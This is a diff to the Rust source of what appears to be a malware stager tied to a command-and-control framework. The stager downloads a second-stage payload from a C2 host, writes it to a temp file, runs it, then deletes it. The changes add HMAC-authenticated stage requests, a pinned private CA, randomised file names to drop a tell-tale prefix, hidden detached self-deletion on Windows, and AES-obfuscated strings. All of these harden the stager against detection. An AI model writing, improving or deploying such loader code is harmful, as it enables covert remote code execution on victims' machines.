@@ -26,9 +26,11 @@ mod config {
     /// Subset of the embedded C2Config the stager actually uses.
     /// Not serde-backed: no field names in the binary.
     pub struct StagerConfig {
+        pub transport: rcm::common::TransportProtocol,
         pub c2_host: String,
         pub tunnel_port: u16,
         pub build_id: String,
+        pub challenge_key: String,
         pub stage_path: String,
     }
 
@@ -38,9 +40,11 @@ mod config {
         let cfg = rcm::common::C2Config::unpack(&bytes)
             .unwrap_or_else(|| std::process::exit(1));
         StagerConfig {
+            transport: cfg.transport,
             c2_host: cfg.c2_host,
             tunnel_port: cfg.tunnel_port,
             build_id: cfg.build_id,
+            challenge_key: cfg.challenge_key,
             stage_path: strcrypt::aes_str!("/stage"),
         }
     }
@@ -51,12 +55,17 @@ fn main() {
     std::panic::set_hook(Box::new(|_| {}));
 
     let cfg = config::load();
+    let scheme = match cfg.transport {
+        rcm::common::TransportProtocol::Http => strcrypt::aes_str!("http"),
+        rcm::common::TransportProtocol::Https => strcrypt::aes_str!("https"),
+        _ => std::process::exit(1),
+    };
     let url = format!("{}://{}:{}{}/{}",
-        strcrypt::aes_str!("https"), cfg.c2_host, cfg.tunnel_port,
+        scheme, cfg.c2_host, cfg.tunnel_port,
         cfg.stage_path, cfg.build_id);
 
     // Attempt download via native TLS
-    match download_stage(&url) {
+    match download_stage(&url, &cfg.build_id, &cfg.challenge_key) {
         Ok(payload) => {
             if let Err(e) = execute_payload(&payload) {
                 if cfg!(debug_assertions) { eprintln!("{} {}", strcrypt::aes_str!("[-] Exec failed:"), e); }
@@ -64,50 +73,89 @@ fn main() {
         }
         Err(e) => {
             if cfg!(debug_assertions) { eprintln!("{} {}", strcrypt::aes_str!("[-] Download failed:"), e); }
-            // Retry with manual HTTP
-            let addr = format!("{}:{}", cfg.c2_host, cfg.tunnel_port);
-            if let Ok(payload) = download_raw_tcp(&addr, &cfg.build_id) {
-                let _ = execute_payload(&payload);
+            // Retry plaintext HTTP only when that is the configured transport.
+            if cfg.transport == rcm::common::TransportProtocol::Http {
+                let addr = format!("{}:{}", cfg.c2_host, cfg.tunnel_port);
+                if let Ok(payload) = download_raw_tcp(&addr, &cfg.build_id, &cfg.challenge_key) {
+                    let _ = execute_payload(&payload);
+                }
             }
         }
     }
 }
 
-fn download_stage(url: &str) -> Result<Vec<u8>, String> {
-    // Use reqwest if available, otherwise fall back to raw TCP
-    let resp = reqwest::blocking::get(url).map_err(|e| e.to_string())?;
+fn stage_auth(build_id: &str, challenge_key_b64: &str) -> Result<(String, String), String> {
+    use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};
+    use hmac::{Hmac, Mac};
+    use sha2::Sha256;
+
+    let key = BASE64.decode(challenge_key_b64.as_bytes()).map_err(|e| e.to_string())?;
+    let timestamp = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map_err(|e| e.to_string())?
+        .as_secs()
+        .to_string();
+    let mut mac = Hmac::<Sha256>::new_from_slice(&key).map_err(|e| e.to_string())?;
+    mac.update(build_id.as_bytes());
+    mac.update(b":");
+    mac.update(timestamp.as_bytes());
+    Ok((timestamp, BASE64.encode(mac.finalize().into_bytes())))
+}
+
+fn download_stage(url: &str, build_id: &str, challenge_key: &str) -> Result<Vec<u8>, String> {
+    let (timestamp, auth) = stage_auth(build_id, challenge_key)?;
+    let mut builder = reqwest::blocking::Client::builder()
+        .timeout(std::time::Duration::from_secs(120))
+        .connect_timeout(std::time::Duration::from_secs(15));
+    if url.starts_with("https:") {
+        let ca = reqwest::Certificate::from_pem(include_bytes!("../../certs/ca.crt"))
+            .map_err(|e| e.to_string())?;
+        builder = builder.add_root_certificate(ca).tls_built_in_root_certs(false);
+    }
+    let resp = builder.build().map_err(|e| e.to_string())?
+        .get(url)
+        .header(strcrypt::aes_str!("x-stage-timestamp"), timestamp)
+        .header(strcrypt::aes_str!("x-stage-hmac"), auth)
+        .send()
+        .map_err(|e| e.to_string())?;
     if !resp.status().is_success() {
         return Err(format!("{} {}", strcrypt::aes_str!("HTTP"), resp.status()));
     }
     resp.bytes().map(|b| b.to_vec()).map_err(|e| e.to_string())
 }
 
-fn download_raw_tcp(addr: &str, build_id: &str) -> Result<Vec<u8>, String> {
+fn download_raw_tcp(addr: &str, build_id: &str, challenge_key: &str) -> Result<Vec<u8>, String> {
     use std::net::TcpStream;
     use std::io::{Read, Write};
 
+    let (timestamp, auth) = stage_auth(build_id, challenge_key)?;
     let mut stream = TcpStream::connect(addr).map_err(|e| e.to_string())?;
-    let request = format!("{}{}{}{}{}",
-        strcrypt::aes_str!("GET /stage/"), build_id,
-        strcrypt::aes_str!(" HTTP/1.1\r\nHost: "), addr,
-        strcrypt::aes_str!("\r\nConnection: close\r\n\r\n"));
+    let request = format!(
+        "GET /stage/{} HTTP/1.1\r\nHost: {}\r\nx-stage-timestamp: {}\r\nx-stage-hmac: {}\r\nConnection: close\r\n\r\n",
+        build_id, addr, timestamp, auth
+    );
     stream.write_all(request.as_bytes()).map_err(|e| e.to_string())?;
 
     let mut response = Vec::new();
     stream.read_to_end(&mut response).map_err(|e| e.to_string())?;
 
-    // Skip HTTP headers
+    // Skip HTTP headers only after confirming a successful staging response.
     if let Some(pos) = response.windows(4).position(|w| w == b"\r\n\r\n") {
+        let headers = String::from_utf8_lossy(&response[..pos]);
+        let status = headers.lines().next().unwrap_or_default();
+        if !status.contains(" 200 ") {
+            return Err(status.to_string());
+        }
         Ok(response[pos + 4..].to_vec())
     } else {
-        Ok(response)
+        Err(strcrypt::aes_str!("Malformed HTTP response"))
     }
 }
 
 fn execute_payload(payload: &[u8]) -> Result<(), String> {
     let temp_dir = std::env::temp_dir();
     let ext = if cfg!(target_os = "windows") { strcrypt::aes_str!(".exe") } else { String::new() };
-    let temp_path = temp_dir.join(format!("{}{}{}", strcrypt::aes_str!("svc_"), uuid_simple(), ext));
+    let temp_path = temp_dir.join(format!("{}{}", uuid_simple(), ext));
 
     fs::write(&temp_path, payload).map_err(|e| e.to_string())?;
 
@@ -120,16 +168,33 @@ fn execute_payload(payload: &[u8]) -> Result<(), String> {
         .spawn()
         .map_err(|e| e.to_string())?;
 
-    // Wait a moment then clean up the file reference (process keeps running)
-    std::thread::sleep(std::time::Duration::from_secs(2));
-    let _ = fs::remove_file(&temp_path);
+    #[cfg(windows)]
+    {
+        use std::os::windows::process::CommandExt;
+        const DETACHED_PROCESS: u32 = 0x00000008;
+        const CREATE_NO_WINDOW: u32 = 0x08000000;
+        let cleanup = format!(
+            "ping 127.0.0.1 -n 4 >NUL & del /F /Q \"{}\"",
+            temp_path.display()
+        );
+        let _ = Command::new(strcrypt::aes_str!("cmd.exe"))
+            .args([strcrypt::aes_str!("/C"), cleanup])
+            .creation_flags(DETACHED_PROCESS | CREATE_NO_WINDOW)
+            .spawn();
+    }
+    #[cfg(not(windows))]
+    {
+        std::thread::sleep(std::time::Duration::from_secs(2));
+        let _ = fs::remove_file(&temp_path);
+    }
 
     Ok(())
 }
 
-/// Simple pseudo-UUID without pulling in the uuid crate
+/// Random artifact name without a predictable prefix.
 fn uuid_simple() -> String {
-    use std::time::{SystemTime, UNIX_EPOCH};
-    let t = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default();
-    format!("{:x}{:x}", t.as_secs(), t.subsec_nanos())
+    use rand::RngCore;
+    let mut bytes = [0u8; 16];
+    rand::rngs::OsRng.fill_bytes(&mut bytes);
+    hex::encode(bytes)
 }
